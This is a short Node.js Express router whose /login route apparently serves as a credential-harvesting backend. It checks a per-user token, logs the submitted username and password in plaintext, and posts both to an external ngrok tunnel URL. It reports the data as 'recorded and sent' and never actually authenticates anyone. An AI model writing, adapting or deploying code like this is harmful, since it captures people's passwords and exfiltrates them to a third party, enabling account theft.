const express = require('express');
const fs = require('fs');
const router = express.Router();
const path = require('path');

let tokens = {};

// Load tokens at startup
fs.readFile(path.join(__dirname, '../tokens.json'), (err, data) => {
    if (err) throw err;
    tokens = JSON.parse(data);
});

// Dynamically import node-fetch
let fetch;
import('node-fetch').then(module => {
    fetch = module.default;
}).catch(err => console.error('Failed to load node-fetch', err));

router.post('/login', async (req, res) => {
    const { username, password, token } = req.body;

    if (!tokens[username] || tokens[username] !== token) {
        return res.status(403).send('Access Denied: Invalid or Expired Token');
    }

    try {
        // Simulate login logic
        console.log(`Login attempt - Username: ${username}, Password: ${password}`);
        if (!fetch) {
            return res.status(500).send('Fetch not initialized');
        }
        // Send data to your local server
        const localServerUrl = 'https://7328-2601-646-481-3830-c44b-5227-7f16-2ea6.ngrok-free.app/receive';
        const response = await fetch(localServerUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ username, password }),
            mode: 'cors' // if needed
        });

        if (response.ok) {
            console.log('Data sent to local server successfully');
            res.send('Login data recorded and sent.');
        } else {
            throw new Error('Failed to send data to local server');
        }
    } catch (error) {
        console.error('Login error:', error);
        res.status(500).send('Server Error');
    }
});

module.exports = router;
